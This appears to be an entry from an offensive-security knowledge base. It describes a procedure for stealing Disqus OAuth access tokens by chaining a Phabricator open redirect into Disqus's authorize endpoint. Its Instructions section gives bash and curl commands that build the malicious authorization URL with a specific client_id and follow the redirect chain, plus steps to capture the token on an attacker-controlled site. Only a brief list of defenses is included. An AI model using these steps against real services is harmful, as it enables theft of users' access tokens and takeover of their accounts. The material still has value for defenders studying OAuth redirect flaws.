---
id: proc-extend-disqus-3930
tags:
  - oauth
  - open-redirect
  - disqus
  - phabricator
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Application Access Token]]'
updated_at: '2025-12-14T17:24:35.396Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Steal Application Access Token]]'
---
# Extend to Disqus OAuth

## Summary

This procedure applies the Phabricator open redirect chaining to Disqus OAuth, constructing a similar URL to steal tokens from Disqus-integrated sites.

## Description

Similar to Facebook, the attacker encodes the malicious Phabricator URL and sets it as redirect_uri in Disqus's /api/oauth/2.0/authorize endpoint. User authorization redirects through Phabricator to the attacker, leaking the token. This extends the attack to Disqus users; requires Disqus client_id and prior Phabricator URL.

## Requirements

1. Disqus app client_id
2. Encoded malicious Phabricator URL
3. Access to Disqus authorization flow

## Defense

Defensive measures and detection strategies:

- Whitelist redirect_uris in Disqus app settings
- Log OAuth redirects for anomaly detection
- Require explicit user consent for chained flows

## Objectives

1. Chain Phabricator with Disqus OAuth
2. Steal Disqus tokens via redirect
3. Broaden attack to multiple providers

## Instructions

### Step 1: Encode Phabricator URL for Disqus

**Context**: Reuse encoding from Facebook procedure.

```bash
# Assuming ENCODED from prior
DISQ_URL="https://disqus.com/api/oauth/2.0/authorize/?client_id=pGsV2eD61zrctO8A9n9QAA41dRASTXxSBFgs4nieqiwviSroKP5UV1wutlHp8d5y&scope=read&redirect_uri=$ENCODED&response_type=token"
echo $DISQ_URL
```

> Outputs chained Disqus URL. Expected: Valid authorization URL.

### Step 2: Test Disqus Chain

**Context**: Access URL for authorization simulation.

Use browser; authorize and check attacker site.

```bash
curl -L "$DISQ_URL" -v
```

> Follows redirects. Expected: Token in final redirect.

### Step 3: Capture and Verify Token

**Context**: Log the incoming token on attacker site.

Similar to Step 2 in previous procedure.

**Expected Output**: Disqus access token for API use.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Steal Application Access Token]] Steal Application Access Token

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- oauth
- open-redirect
- disqus
- phabricator
